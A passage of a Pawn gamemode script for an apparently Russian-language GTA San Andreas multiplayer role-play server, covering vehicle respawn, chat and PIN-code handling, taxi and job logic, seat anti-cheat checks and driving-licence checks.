	GetVehicleZAngle(vehicleid, veh__pos[vehicleid][3]);
    if(GetVehicleModel(vehicleid) == 462) Fuel[vehicleid] = 999999;
    if(RentCar[vehicleid] > -1)
    {
    	Fuel[vehicleid] = 100;
        RentCar[vehicleid] = -1;
        Locked[vehicleid] = -1;
    }
	Trunk[vehicleid] = false;
	Lights[vehicleid] = false;
	Capot[vehicleid] = false;
	Okna[vehicleid][0] = false;
	Okna[vehicleid][1] = false;
	Okna[vehicleid][2] = false;
	Okna[vehicleid][3] = false;
//    DestroyDynamic3DTextLabel(CarLable[vehicleid]);
    SetVehicleParamsEx(vehicleid,false,false, false,false,false,false,false);
    if(vehicleid >= CarRob[0] && vehicleid <= CarRob[7])
    {
        for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(!IsPlayerConnected(i) || PlayerLogged[i] == false  || GetPVarInt(i,"CarRob")) continue;
			new x = GetPVarInt(i,"CarRob")-1;
			if(CarRob[x] != vehicleid) continue;
			SetVehicleVirtualWorld(vehicleid,18);
			GangZoneHideForPlayer(i,CarRobGz[x]);
			DeletePVar(i,"CarRob");
			DeletePVar(i,"RobCarTime");
			DeletePVar(i,"CarRobW");
			SendClientMessage(i,CREWARD,"Вы провалили задание!");
			break;
		}
    }
    if(vehicleid >= rentcar[0] && vehicleid <= rentcar[1])
    {
	    for(new g = 0; g < MAX_PLAYERS; g++)
		{
			if(!IsPlayerConnected(g) || PlayerLogged[g] == false || vehicleid != BankGrab[PlayerInfo[g][pGrabTeam]][bVeh]) continue;
			SendBandMes(PlayerInfo[g][pGrabTeam],CREWARD,"Ограбление провалено! Причина: Транспорт уничтожен");
		    ClearBank(PlayerInfo[g][pGrabTeam],BankGrab[PlayerInfo[g][pGrabTeam]][bTown]);
		    ClearBand(PlayerInfo[g][pGrabTeam]);
		    break;
		}
	}
   	for (new idx = 1;idx <= TOTALCJ;idx ++)
	{
	    if(CarJob[idx][jcar] == INVALID_VEHICLE_ID || vehicleid !=  CarJob[idx][jcar]) continue;
        switch(CarJob[idx][jidcar])
        {
            case 514,403,515:
            {
                UpdateDynamic3DTextLabelText(CarLable[CarJob[idx][jcar]],-1,"Дальнобойщик\n{f7ae11}[Аренда]");
            }
            case 456: UpdateDynamic3DTextLabelText(CarLable[CarJob[idx][jcar]],-1,"Развозчик\n{f7ae11}[Аренда]");
            case 525: UpdateDynamic3DTextLabelText(CarLable[CarJob[idx][jcar]],-1,"Механик\n{f7ae11}[Аренда]");
            case 437: UpdateDynamic3DTextLabelText(CarLable[CarJob[idx][jcar]],-1,"Автобус\n{f7ae11}[Аренда]");
            case 420:
			{
			    UpdateDynamic3DTextLabelText(CarLable[CarJob[idx][jcar]],-1,"Такси\n{f7ae11}[Аренда]");
			  //  obj = CreateDynamicObject(19327,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
			//	SetDynamicObjectMaterialText(obj, 0, "{FFFFFF}- TAXI SA -", 90, "Calibri", 20, 0, 0, 0, 0);
			//	AttachDynamicObjectToVehicle(obj, CarJob[idx][jcar], 0.740, -1.945, 0.348, -57.200, 0.000, 0.000);

			//	obj = CreateDynamicObject(19327,0.0,0.0,-1000.0,0.0,0.0,0.0,-1,-1,-1,300.0,300.0);
			//	SetDynamicObjectMaterialText(obj, 0, "{FFFFFF}Tel: -911-", 90, "Calibri", 27, 0, 0, 0, 1);
			//	AttachDynamicObjectToVehicle(obj, CarJob[idx][jcar], 0.000, -1.713, 0.507, -58.899, 0.000, 0.000);

			}

        }
	}
	for(new idx = 1; idx<= TOTALVEH; idx++)
	{
	    if(VehInfo[idx][vVehicle] == INVALID_VEHICLE_ID || vehicleid !=  VehInfo[idx][vVehicle]) continue;
		if(VehInfo[idx][vFr] != F_FBI) continue;
		if(VehInfo[idx][vModel] != 418 && VehInfo[idx][vModel] != 560) continue;
		if(VehInfo[idx][vModel] == 418)
		{
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1010);
		}
		if(VehInfo[idx][vModel] == 560)
		{
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1010);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1139);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1033);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1170);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1140);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1031);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1030);
		    AddVehicleComponent(VehInfo[idx][vVehicle], 1029);
		}
	}
    for(new i = 1; i<= TOTALV; i++)
	{
	    if(VInfo[i][vcar] == INVALID_VEHICLE_ID) continue;
		if(vehicleid == VInfo[i][vcar])
		{
		    if(strcmp(VInfo[i][vname],"None",true))
			{
			    if(VInfo[i][vobj1])
				{
					DestroyDynamicObject(VInfo[i][vobj1]);
					VInfo[i][vobj1] = 0;
					new player = GetPlayerID(VInfo[i][vname]);
					if(player != INVALID_PLAYER_ID)
					{
						DeletePVar(player,"Taxist");
						DeletePVar(player,"MarTaxi");
						DeletePVar(player,"KM");
						DeletePVar(player,"Meh");
					}
				}
                if(IsLocked[vehicleid] == false) CarDoors(vehicleid,0);
                else CarDoors(vehicleid,1);
				SetTuning(vehicleid,i);
				SetVehicleVirtualWorld(vehicleid,VInfo[i][vvirt]);
                LinkVehicleToInterior(vehicleid,VInfo[i][vint]);
			}

		}
	}
	return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
	if(vehicleid == fbidal)
	{
	    new Float:x, Float:y, Float:z;
	    for(new i = 0; i < MAX_PLAYERS; i++)
	    {
	        if(!IsPlayerConnected(i) || PlayerLogged[i] == false || GetPlayerVirtualWorld(i) != fbidal || !GetPVarInt(i,"InFbiCar")) continue;
		    GetPlayerPos(i, x, y, z);
		    TogglePlayerControllable(i, 0);
		    CreateExplosionForPlayer(i,x, y, z, 7, 10.0);
		    CreateExplosionForPlayer(i,x, y+4.0, z, 7, 10.0);
		    CreateExplosionForPlayer(i,x, y-4.0, z, 7, 10.0);
		    CreateExplosionForPlayer(i,x+4.0, y, z, 7, 10.0);
		    CreateExplosionForPlayer(i,x-4.0, y, z, 7, 10.0);
		    TogglePlayerControllable(i, 1);
		    DeletePVar(i,"InFbiCar");
	    }
	}
	return 1;
}

public OnPlayerText(playerid, text[])
{
	if(PlayerLogged[playerid] == false || GetPVarInt(playerid,"CheckProvAdm")) return false;
	if(GetPVarInt(playerid,"PinCodeUst") > 0)
	{
	    PlayerInfo[playerid][pPin] = strval(text);
		static const fmt_string2[] = "Вы установили PIN-CODE: %i";
		new str2[sizeof(fmt_string2)+50];
		format(str2, sizeof(str2), fmt_string2,strval(text));
		SendClientMessage(playerid,CLIGHTRED,str2);
		DeletePVar(playerid,"PinCodeUst");
		return false;
	}
	if(GetPVarInt(playerid,"PinCode") > 0)
	{
	    if(PlayerInfo[playerid][pPin] != strval(text))
	    {
	        SendClientMessage(playerid,CLIGHTRED,"Вы ввели нерпавельный PIN-CODE");
	        Kick(playerid, FIX_FUNCTION, 1200);
	        DeletePVar(playerid,"PinCode");
	        return false;
	    }
	    else
	    {
	        SendClientMessage(playerid,CLIGHTRED,"Проверка пройдена");
  			new ipStr[16];
			GetPlayerIp( playerid, ipStr, 16 );
			if(PlayerInfo[playerid][pAdmin] && PlayerInfo[playerid][pAdmin] < 6)
	        {
	            new sas[2] = 0;
				new podIP[2],podIPREG[2],podIPs[2],d;
				sscanf(ipStr,"p<.>dddd",podIPs[0],podIPs[1],d,d);
				sscanf(PlayerInfo[playerid][pIp],"p<.>dddd",podIP[0],podIP[1],d,d);
				sscanf(PlayerInfo[playerid][pIpReg],"p<.>dddd",podIPREG[0],podIPREG[1],d,d);


				if(podIPs[0] != podIP[0] && podIPs[1] != podIP[1]) sas[0] = 1;
				if(podIPs[0] != podIPREG[0] && podIPs[0] != podIPREG[1]) sas[1] = 1;
			    static const fmt_stri1ng[] = "[A] %s: С последнего захода: %s{FFFF00} | С регистрации: %s";
				new stri1ng[sizeof(fmt_stri1ng)+70-4+24];
				format(stri1ng, sizeof(stri1ng),fmt_stri1ng,PlayerInfo[playerid][pSendername],(sas[0]) ? ("{D50000}[Подозрение на взлом]"):("{FFFFFF}[Подсеть совпала]"),(sas[1]) ? ("{D50000}[Подозрение на взлом]"):("{FFFFFF}[Подсеть совпала]"));
			    SendAdminMessage(CYELLOW, stri1ng);
	        }
			SetPlayerStr(PlayerInfo[playerid][pSendername],"ip",ipStr);
			query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Зашел на сервер IP: %s','%d')",PlayerInfo[playerid][pID],ipStr,gettime());
			mysql_tquery(mysql,query);
	        TogglePlayerControllable(playerid, 1);
	        DeletePVar(playerid,"PinCode");
	        DeletePVar(playerid,"CheckProv");
	        return false;
	    }
	}
	if(GetPVarInt(playerid,"PinCodeSmen") > 0)
	{
	    if(PlayerInfo[playerid][pPin] != strval(text))
	    {
	        SendClientMessage(playerid,CLIGHTRED,"Вы ввели нерпавельный PIN-CODE");
	        Kick(playerid, FIX_FUNCTION, 1200);
	        DeletePVar(playerid,"PinCodeSmen");
	        return false;
	    }
	    else
	    {
	        SetPVarInt(playerid,"PinCodeUst",1);
			SendClientMessage(playerid,CLIGHTRED,"Теперь введите новый PIN-CODE");
			DeletePVar(playerid,"PinCodeSmen");
			return false;
	    }
	}
	if(GetPVarInt(playerid,"PinCodeVkl") > 0)
	{
	    if(PlayerInfo[playerid][pPin] != strval(text))
	    {
	        SendClientMessage(playerid,CLIGHTRED,"Вы ввели нерпавельный PIN-CODE");
	        Kick(playerid, FIX_FUNCTION, 1200);
	        DeletePVar(playerid,"PinCodeVkl");
	        return false;
	    }
	    else
	    {
			PlayerInfo[playerid][pPin1] = 0;
			SendClientMessage(playerid,CLIGHTRED,"Вы отключили проверку");
			DeletePVar(playerid,"PinCodeVkl");
			query = "";
			format(query,sizeof(query),"INSERT INTO `logs` ( `id`, `cho`,`time`) VALUES ('%d', 'Отключил PIN-CODE','%d')",PlayerInfo[playerid][pID],gettime());
			mysql_tquery(mysql,query);
			return false;
	    }
	}
	if( IsAIP(text) )
	{
		static const fmt_string1[] = "[A] Warning: %s[%d] (chat): %s";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME+4+64];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername],playerid,text);
		SendAdminMessage(CLIGHTRED,str1);
		ReplaceText(text);
		return false;
	}
	if(GetPVarInt(playerid,"AntiFlood7") > gettime())
	{
	    SendClientMessage(playerid,CGREY,"Не флуди");
	    return false;
	}
    if(GetPVarInt(playerid,"EfirZvon") > 0)
    {
		static const fmt_str1[] = "[CNN] | Телефон %s: %s";
		new string1[sizeof(fmt_str1)+32+128];
		format(string1, sizeof(string1), fmt_str1, PlayerInfo[playerid][pSendername],text);
		SendClientMessageToAll(0xFF924AFF,string1);
		return false;
	}
	if(GetPVarInt(playerid,"Efir") > 0)
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 582 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 488 && !IsPlayerInRangeOfPoint(playerid, 5.0,1397.8793,1240.8773,2565.3330))
		{
			SendClientMessage(playerid,CGREY,"Вы не в здании Central News Network или не в специальном транспорте");
			DeletePVar(playerid,"Efir");
	  		return false;
		}
		static const fmt_str1[] = "[CNN] | Ведущий %s: %s";
		new string1[sizeof(fmt_str1)+32+128];
		format(string1, sizeof(string1), fmt_str1, PlayerInfo[playerid][pSendername],text);
		SendClientMessageToAll(0xFF924AFF,string1);
		return false;
	}
	if(GetPVarInt(playerid,"EfirGost") > 0)
	{
		if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 582 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 488 && !IsPlayerInRangeOfPoint(playerid, 5.0,1397.8793,1240.8773,2565.3330))
		{
			SendClientMessage(playerid,CGREY,"Вы не в здании Central News Network или не в специальном транспорте");
			DeletePVar(playerid,"EfirGost");
	  		return false;
		}
		static const fmt_str1[] = "[CNN] | Гость %s: %s";
		new string1[sizeof(fmt_str1)+32+128];
		format(string1, sizeof(string1), fmt_str1, PlayerInfo[playerid][pSendername],text);
		SendClientMessageToAll(0xFF924AFF,string1);
		return false;
	}
	if(GetPVarInt(playerid,"Razgovor") > 0)
	{
		if(PlayerInfo[playerid][pMuted] > 0)
		{
		    SetPlayerChatBubble(playerid,"Что-то промычал",CREWARD,20.0,1000);
	  	 	static const fmt_str[] = "Молчанка заканчивается через %i секунд";
			new string[sizeof(fmt_str)+10];
			format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
			SendClientMessage(playerid,CGREY,string);
			return false;
		}
		static const fmt_str1[] = "[TEL]{FFFFFF} %s: %s";
		new string1[sizeof(fmt_str1)+32+128];
		format(string1, sizeof(string1), fmt_str1, PlayerInfo[playerid][pSendername],text);
		SendClientMessage(playerid,CREWARD,string1);
		SendClientMessage(GetPVarInt(playerid,"ZvonID"),0xBFC0C2FF,string1);
 		static const fmt_str[] = "[TEL] %s";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, text);
		SetPlayerChatBubble(playerid,string,CREWARD,20.0,1000);
		return false;
	}
	if(strcmp(text, ")", true) == 0 || strcmp(text, "=)", true) == 0)
	{
	    cmd_me(playerid,"улыбается");
	    return false;
	}
	if(strcmp(text, "(", true) == 0)
	{
	    cmd_me(playerid,"грустит");
	    return false;
	}
	if(strcmp(text, "((", true) == 0)
	{
	    cmd_me(playerid,"сильно расстроился");
	    return false;
	}
	if(strcmp(text, "xD", true) == 0 || strcmp(text, ":D", true) == 0 || strcmp(text, "чВ", true) == 0 || strcmp(text, "ЖВ", true) == 0  || strcmp(text, "))", true) == 0)
	{
	    cmd_me(playerid,"смеется");
	    return false;
	}
	
	if(PlayerInfo[playerid][pMuted] > 0)
	{
		SetPlayerChatBubble(playerid,"Что-то промычал",CREWARD,20.0,1000);
		static const fmt_str[] = "Молчанка заканчивается через %i секунд";
		new string[sizeof(fmt_str)+10];
		format(string, sizeof(string), fmt_str, PlayerInfo[playerid][pMuted]);
		SendClientMessage(playerid,CGREY,string);
		return false;
	}
	if(PlayerLogged[playerid] == false) return false;
	static const fmt_str[] = "{%06x} - %s[%d]{FFFFFF} говорит: %s";
	new string[sizeof(fmt_str)+10+MAX_PLAYER_NAME+4+128];
	if(strlen(text) >= 80)
	{
		new string1[128];//?????????? ??? ???????? ????????????? ??????
		new mess[128];//?????????? ??? ?????????????? ? ???????? ?.?
		strmid(string1,text,64,128,128);//??????? ????? ??? ???????? ? ??????????
		strdel(text,64,128);
		format(string, sizeof(string), fmt_str, GetPlayerColor(playerid) >>> 8,PlayerInfo[playerid][pSendername], playerid,text);
		ProxDetector(20.0, playerid, string,CFADE1);
		SetPlayerChatBubble(playerid,text,CREWARD,20.0,10000);
		format(mess, sizeof(mess), "{FFFFFF}%s",string1);
		ProxDetector(20.0, playerid, mess,CFADE1);
	}
	else
	{
	    format(string, sizeof(string), fmt_str, GetPlayerColor(playerid) >>> 8,PlayerInfo[playerid][pSendername], playerid,text);
		ProxDetector(20.0, playerid, string,CFADE1);
		SetPlayerChatBubble(playerid,text,CREWARD,20.0,10000);
	}
	
	
	
	if(!GetPVarInt(playerid,"AntiSbiv") && !GetPVarInt(playerid,"AnimGo"))
	{
	    if(GetPVarInt(playerid,"TimerRaz") > 0) KillTimer(GetPVarInt(playerid,"TimerRaz")),DeletePVar(playerid,"TimerRaz");
	    if(strlen(text) < 16)
	    {
			ApplyAnimation(playerid,"PED","IDLE_CHAT",4.1,0,1,1,1,1,1);
			new kek = SetTimerEx("ClearAnim", 130*15, 0, "d", playerid);
			SetPVarInt(playerid,"TimerRaz",kek);
		}
		else
		{
		    ApplyAnimation(playerid,"PED","IDLE_CHAT",4.1,0,1,1,1,1,1);
			new kek = SetTimerEx("ClearAnim", 130*strlen(text), 0, "d", playerid);
			SetPVarInt(playerid,"TimerRaz",kek);
		}
	}
	SetPVarInt(playerid,"AntiFlood7",gettime() + 1);
	return false;
}



public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{

    SetPVarInt(playerid,"CarID",vehicleid);
    tp__ignore_tick[playerid] = GetTickCount()+TP__IGNORE_TIME;

	if(GetPVarInt(playerid,"PesW") == 2)
	{
		SetPVarInt(playerid,"PesW",1);
		SetPlayerSpecialAction(playerid,0);
		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		SetPlayerAttachedObject(playerid, 1, 337, 6, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.00, 1.000000);
        DisablePlayerCheckpoint(playerid);
        new check,picka;
        switch(random(8))
		{

		    case 0: check = CreateDynamicCP(-1326.5011,2720.1338,52.4785, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1326.5011,2720.1338,52.4785, 0, 0, playerid, 100.0);
			case 1: check = CreateDynamicCP(-1327.5321,2726.7690,57.4201, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1327.5321,2726.7690,57.4201, 0, 0, playerid, 100.0);
			case 2: check = CreateDynamicCP(-1339.5184,2716.8699,57.5608, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1339.5184,2716.8699,57.5608, 0, 0, playerid, 100.0);
			case 3: check = CreateDynamicCP(-1331.4587,2705.1772,54.6513, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1331.4587,2705.1772,54.6513, 0, 0, playerid, 100.0);
			case 4: check = CreateDynamicCP(-1346.6035,2731.0549,56.3454, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1346.6035,2731.0549,56.3454, 0, 0, playerid, 100.0);
			case 5: check = CreateDynamicCP(-1341.8770,2754.1526,60.3163, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1341.8770,2754.1526,60.3163, 0, 0, playerid, 100.0);
			case 6: check = CreateDynamicCP(-1331.9568,2748.6819,59.9250, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1331.9568,2748.6819,59.9250, 0, 0, playerid, 100.0);
			case 7: check = CreateDynamicCP(-1359.0675,2726.4775,57.1666, 3.0,0,0,playerid,100.0),picka = CreateDynamicPickup(19135, 23, -1359.0675,2726.4775,57.1666, 0, 0, playerid, 100.0);
		}
		SetPVarInt(playerid,"PesCheck",check);
		SetPVarInt(playerid,"PesPick",picka);
		SendClientMessage(playerid,CLIGHTRED,"Вы уронили мешок");
	}
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
    tp__ignore_tick[playerid] = GetTickCount()+TP__IGNORE_TIME;
    gun__ignore_tick[playerid] = GetTickCount()+GUN__IGNORE_TIME;
    if(IsAPlane(vehicleid)) GivePlayerWeapon(playerid,46,1);
	if(GetPVarInt(playerid,"LicTest") > 0 && vehicleid == GetPVarInt(playerid,"LicCar"))
	{
		SetPVarInt(playerid,"LicMag",20);
		SendClientMessage(playerid,CREWARD,"У Вас есть 20 секунд, чтобы вернуть в транспорт");
	}
   	if(GetPlayerVehicleSeat(playerid) == 0)
	{
	    GetVehiclePos(vehicleid, veh__pos[vehicleid][0], veh__pos[vehicleid][1], veh__pos[vehicleid][2]);
		GetVehicleZAngle(vehicleid, veh__pos[vehicleid][3]);
	}
	if(GetVehicleModel(vehicleid) == 525 && PlayerInfo[playerid][pJob] == 58)
	{
		if(GetPVarInt(playerid,"Meh") == 1)
		{
			SendClientMessage(playerid,CREWARD,"У вас есть 5 минут, чтобы вернуться в рабочий транспорт");
			SetPVarInt(playerid,"SekBus",300);
		}
	}
	if(PlayerInfo[playerid][pJob] > 0 && GetVehicleModel(vehicleid) != 525)
	{
	    if(GetVehicleModel(vehicleid) == 403 || GetVehicleModel(vehicleid) == 414 ||
	    GetVehicleModel(vehicleid) == 456 || GetVehicleModel(vehicleid) == 459 ||
	    GetVehicleModel(vehicleid) == 515 || GetVehicleModel(vehicleid) == 408 ||
	    GetVehicleModel(vehicleid) == 574 || GetVehicleModel(vehicleid) == 418 ||
	    GetVehicleModel(vehicleid) == 431 || GetVehicleModel(vehicleid) == 420 ||
	    GetVehicleModel(vehicleid) == 437 || GetVehicleModel(vehicleid) == 438 ||
	    GetVehicleModel(vehicleid) == 443)
	    {
			if(GetPVarInt(playerid,"Mar") > 0)
		 	{
		 	    DisablePlayerRaceCheckpoint(playerid);
				SendClientMessage(playerid,CREWARD,"У вас есть 30 секунд, чтобы вернуться в рабочий транспорт");
				SetPVarInt(playerid,"SekBus",30);
			}
		}
	}
	DeletePVar(playerid,"Taxi");
	DeletePVar(playerid,"TaxiID");
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
    //if(oldstate == 2 || oldstate == 3) tp__ignore_tick[playerid] = GetTickCount()+TP__IGNORE_TIME;
 //   printf("1 OnPlayerStateChange %d %d",GetPVarInt(playerid,"AttachPlayer"),GetPVarInt(GetPVarInt(playerid,"AttachPlayer")-1,"Cops"));
    if(GetPVarInt(playerid,"AttachPlayer") && GetPVarInt(GetPVarInt(playerid,"AttachPlayer")-1,"Cops"))
	{
		new player = GetPVarInt(playerid,"AttachPlayer")-1;
	 //	printf("2 OnPlayerStateChange %d ",player);
		if(newstate == PLAYER_STATE_DRIVER ||
			newstate == PLAYER_STATE_PASSENGER)
		{
		   //  printf("3 OnPlayerStateChange");
			new
				free_seatid,
				vehicleid = GetPlayerVehicleID(playerid);


			if((free_seatid = gc_GetFreeSeat(vehicleid)) != -1)
			{
                // printf("4 OnPlayerStateChange");
				ClearAnimations(player, 1);
				PutPlayerInVehicle(player,
					vehicleid, free_seatid);
			 //	printf("5 OnPlayerStateChange");
                SetPVarInt(player,"CopCar",1);
				SetPVarInt(player,"Jail",1);
				TogglePlayerControllable(player, 0);
				SendClientMessage(playerid,-1,"Чтобы посадить игрока около входа в тюрьму, используйте {f7ae11}/arrest");
				static const fmt_string[] = "%s взял %s и затолкал в машину";
				new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME];
				format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[player][pSendername]);
				ProxDetectorNew(playerid,30.0,COLOR_PURPLE,str);
				SetPlayerChatBubble(playerid, "затолкал в машину", COLOR_PURPLE, 30.0, 7000);
				DeletePVar(player,"Cops");
				DeletePVar(player,"CopsID");
				DeletePVar(playerid,"AttachPlayer");
			}

			else
			{
				SendClientMessage(playerid, CGREY, "В транспорта недостаточно мест!");
			}
		}

		else if(newstate == PLAYER_STATE_ONFOOT &&
			(oldstate == PLAYER_STATE_DRIVER ||
			oldstate == PLAYER_STATE_PASSENGER) &&
			IsPlayerInAnyVehicle(player))
		{
			RemovePlayerFromVehicle(player);
			DeletePVar(player,"CopCar");
			DeletePVar(player,"Jail");

			gc_UpdateSuspect(player);
		}
	}
    if(oldstate == PLAYER_STATE_DRIVER || oldstate == PLAYER_STATE_PASSENGER) gun__ignore_tick[playerid] = GetTickCount()+GUN__IGNORE_TIME;
    if(newstate == PLAYER_STATE_PASSENGER)
	{
	    static const MaxPassengers[27] =
		{
			0x10331113, 0x11311131, 0x11331313, 0x80133301,
			0x1381F110, 0x10311103, 0x10001F10, 0x11113311,
			0x13113311, 0x31101100, 0x30001301, 0x11031311,
			0x11111331, 0x10013111, 0x01131100, 0x11111110,
			0x11100031, 0x11130221, 0x33113311, 0x11111101,
			0x33101133, 0x101001F0, 0x03133111, 0xFF11113F,
			0x13330111, 0xFF131111, 0x0000FF3F
		};
		new model = GetVehicleModel(GetPlayerVehicleID(playerid));
		if(400 <= model <= 611 && model != 483)
		{
			model -= 400;
			new seat = GetPlayerVehicleSeat(playerid);
			if(seat != 128)
			{
				model = (MaxPassengers[model >>> 3] >>> ((model & 7) << 2)) & 0xF;
				if(!model || model == 15)
				{
					if(!GetPVarInt(playerid,"Cheat"))
					{
					 	SaveAccount(playerid),CheatKick(playerid,0);
					}
					return true;
				}
				else if(!(0 < seat <= model))
				{
				    if(!GetPVarInt(playerid,"Cheat"))
					{
					 	SaveAccount(playerid),CheatKick(playerid,0);
					}
				}
			}
			else 
			{
			    if(!GetPVarInt(playerid,"Cheat"))
				{
				 	SaveAccount(playerid),CheatKick(playerid,0);
				}
			}
		}
	}
    if(oldstate == PLAYER_STATE_ONFOOT && newstate == PLAYER_STATE_PASSENGER)
    {
		new heh = 0;
	    for(new i = 0; i < MAX_PLAYERS; i++)
		{
			if(GetPlayerVehicleID(i) == GetPlayerVehicleID(playerid) && GetPVarInt(i,"Taxist") > 0 && GetPlayerState(i) == PLAYER_STATE_DRIVER) heh = i+1;
		}
	    if(heh > 0)
		{
		    for(new v = 1; v <= TOTALV; v++)
			{
			    if(VInfo[v][vcar] == INVALID_VEHICLE_ID) continue;
				if(GetPlayerVehicleID(playerid) == VInfo[v][vcar])
				{
		  			if(strcmp(VInfo[v][vname], PlayerInfo[heh-1][pSendername], true) == 0 && VInfo[v][vobj1]) heh = 1000;
				}
			}
			if(heh == 1000)
			{
		        SetPVarInt(playerid,"Taxi",1);
				GetVehiclePos(GetPlayerVehicleID(playerid),taxipos[playerid][0],taxipos[playerid][1],taxipos[playerid][2]);
				SendClientMessage(playerid,CREWARD,"Вы сели в такси, для удобства вы можете обозначить точку на карте и она покажется таксисту");
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(!IsPlayerConnected(i) || PlayerLogged[i] == false) continue;
					if(GetPlayerVehicleID(i) == GetPlayerVehicleID(playerid) && GetPlayerState(i) == PLAYER_STATE_DRIVER) SetPVarInt(playerid,"TaxiID",i);
				}
			}
		}
    }
    if((oldstate == PLAYER_STATE_DRIVER)
	&&(newstate == PLAYER_STATE_ONFOOT))
	{
	    if(GetPVarInt(playerid,"InDrift"))
	    {
			SetPVarInt(playerid,"CarID",driftveh[GetPVarInt(playerid,"DriftVeh")]);
			PutPlayerInVehicle(playerid, driftveh[GetPVarInt(playerid,"DriftVeh")], 0);
			SendClientMessage(playerid, 0xAFAFAFFF, "Выход из транспорта запрещен!");
		}
	}
    if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
	{
		if(GetPlayerWeapon(playerid) == 24) SetPlayerArmedWeapon(playerid,0);
		SetPVarInt(playerid,"Heh",gettime() + 2);
	}
	switch(newstate)
	{
		case 1:
			{
				for(new i = 0; i < 29; i++) TextDrawHideForPlayer(playerid,Speedometr[i]);
				for(new i = 0; i < 7; i++) PlayerTextDrawHide(playerid,SpeedometrP[i][playerid]);
				if(GetPVarInt(playerid,"UnLic") > 0)
				{
				    SetPlayerDrunkLevel(playerid,0);
				    DeletePVar(playerid,"UnLic");
				}

			    DeletePVar(playerid,"CarID");
			}
		case 2:
			{
			    if(GetPVarInt(playerid,"GruzW") == 2)
				{
					SetPVarInt(playerid,"GruzW",1);
					SetPlayerSpecialAction(playerid,0);
					if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
					SetPlayerCheckpoint(playerid, 1738.3090,761.8082,10.6680, 3.0);
					SendClientMessage(playerid,CLIGHTRED,"Вы уронили ящик");
				}
			    new Float:vehhp;
				GetVehicleHealth(GetPlayerVehicleID(playerid), vehhp);
			    ServerHPVehicle[GetPlayerVehicleID(playerid)] = vehhp;
			    GetVehiclePos(GetPlayerVehicleID(playerid),carpos[playerid][0],carpos[playerid][1],carpos[playerid][2]);

			    if(IsABoat(GetPlayerVehicleID(playerid)))
				{
					if(PlayerInfo[playerid][pLic][L_VOD] != 1)
					{
       					SetPVarInt(playerid,"UnLic",1);
					 	SetPlayerDrunkLevel(playerid,15000);
					 	SendClientMessage(playerid,CGREY,"У Вас нет прав на вождение данного транспорта!");
					}
				}
 				else if(IsAPlane(GetPlayerVehicleID(playerid)))
			 	{
				 	if(PlayerInfo[playerid][pLic][L_VOZ] != 1)
				 	{
					 	SetPVarInt(playerid,"UnLic",1);
					 	SetPlayerDrunkLevel(playerid,15000);
					 	SendClientMessage(playerid,CGREY,"У Вас нет прав на вождение данного транспорта!");
					}
				}
			 	else if(IsABike(GetPlayerVehicleID(playerid)))
			 	{
				  	if(PlayerInfo[playerid][pLic][L_MOTO] != 1 && GetPVarInt(playerid,"LicTest") == 0)
				  	{
					  	SetPVarInt(playerid,"UnLic",1);
					 	SetPlayerDrunkLevel(playerid,15000);
					 	SendClientMessage(playerid,CGREY,"У Вас нет прав на вождение данного транспорта!");
					}
				}
				else if(IsABus(GetPlayerVehicleID(playerid)))
			 	{
				  	if(PlayerInfo[playerid][pLic][L_BUS] != 1 && GetPVarInt(playerid,"LicTest") == 0)
				  	{
					  	SetPVarInt(playerid,"UnLic",1);
					 	SetPlayerDrunkLevel(playerid,15000);
					 	SendClientMessage(playerid,CGREY,"У Вас нет прав на вождение данного транспорта!");
					}
				}
				else if(IsAGruz(GetPlayerVehicleID(playerid)))
			 	{
				  	if(PlayerInfo[playerid][pLic][L_GRUZ] != 1 && GetPVarInt(playerid,"LicTest") == 0)
				  	{
					  	SetPVarInt(playerid,"UnLic",1);
					 	SetPlayerDrunkLevel(playerid,15000);
					 	SendClientMessage(playerid,CGREY,"У Вас нет прав на вождение данного транспорта!");
					}
				}
			 	else
			 	{
				 	if(PlayerInfo[playerid][pLic][L_AVTO] != 1 && GetPVarInt(playerid,"LicTest") == 0 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 462 && !IsInv(GetPlayerVehicleID(playerid)))
				 	{
					 	SetPVarInt(playerid,"UnLic",1);
					 	SetPlayerDrunkLevel(playerid,15000);
